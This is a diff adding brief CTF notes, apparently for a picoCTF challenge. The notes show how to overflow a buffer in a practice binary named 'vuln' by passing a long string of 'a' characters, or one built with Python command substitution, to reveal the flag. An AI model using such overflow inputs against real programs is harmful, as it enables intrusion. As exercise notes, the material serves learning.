@@ -1,0 +1,21 @@
+#login in to pico shell
+
+file *
+
+#vuln is an executable
+
+./vuln
+
+#prompt will say it takes an argument
+
+.vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+#give it a big enough input to overflow the buffer and the flag shall be yours!
+
+#alternatively, you can use command substitution if you dont want to manually write a bunch of a's
+
+./vuln $(python -c "print 'a'*28")
+
+#python -c tells bash to run this python command 
+#$() places the output of the command as the argument to ./vuln run command
+                                                                       
